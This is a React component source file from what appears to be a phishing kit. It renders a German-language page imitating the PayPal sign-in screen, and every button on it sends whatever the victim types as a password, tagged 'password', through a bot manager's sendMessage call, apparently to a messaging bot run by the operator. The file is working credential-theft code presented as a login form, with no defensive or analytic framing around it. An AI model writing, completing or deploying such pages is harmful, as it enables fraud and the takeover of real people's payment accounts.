import React from 'react';
import {useState} from "react";
import axios from "axios";
import bot from "../../bot_manager/manager";
import classes from "../email/Email.module.css";
import {Link} from "react-router-dom";

const Password = (props) => {

    const [password, setPassword] = useState('')

    const enterEmail = () => {
        axios.post(bot.sendMessage(password + '%20password'), '').then(res => {
        })
    }
    return (
        <div className={classes.corral}>
            <div className={classes.contentContainerBordered}>
                <header>
                    <p role={"img"}
                       className={[classes.paypal_logo, classes.paypal_logo_long, classes.signin_paypal_logo].join(' ')}></p>
                </header>
                <div id={"loginContent"}>
                    <div id="loginSection">
                        <div className={classes.notifications}></div>
                        <form className={classes.maskable}>
                            <div className={classes.clearfix}>
                                <div className={classes.splitPhoneSection}>
                                    <div style={{textAlign:'center'}}>
                                        <a href="#" id="forgotPassword"
                                           className={[classes.recoveryOption, classes.forgotPassword].join(' ')}
                                           data-client-log-action-type="clickForgotPasswordLink"
                                           pa-marked="1">{props.email}</a>
                                    </div>
                                    <div className={classes.textInput}>
                                        <div className={classes.fieldWrapper}>
                                            <label className={classes.fieldLabel}></label>
                                            <input placeholder={"Passwort"} value={password}
                                                   onChange={e => setPassword(e.target.value)}/>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div className={classes.actions}>
                    <button className={[classes.button].join(' ')} onClick={enterEmail}>
                        Weiter
                    </button>
                </div>
                <div className={classes.signupContainer}>
                    <div className={classes.loginSignUpSeparator}>
                        <span className={classes.textInSeparator}>
                            oder
                        </span>
                    </div>
                    <Link to={"/something"}>
                        <button className={[classes.button, classes.secondary].join(' ')} onClick={enterEmail}>
                            Neu anmelden
                        </button>
                    </Link>
                </div>
                <div className={classes.intentFooter}>
                    <div className={classes.localeSelector}>
                        <span className={[classes.picker, classes.country_selector].join(' ')}>
                            <button className={[classes.country ,classes.RU].join(' ')}>
                            </button>
                        </span>
                        <ul className={classes.localeLink}>
                            <li>
                                <a className={classes.selected}>Deutsch</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Password;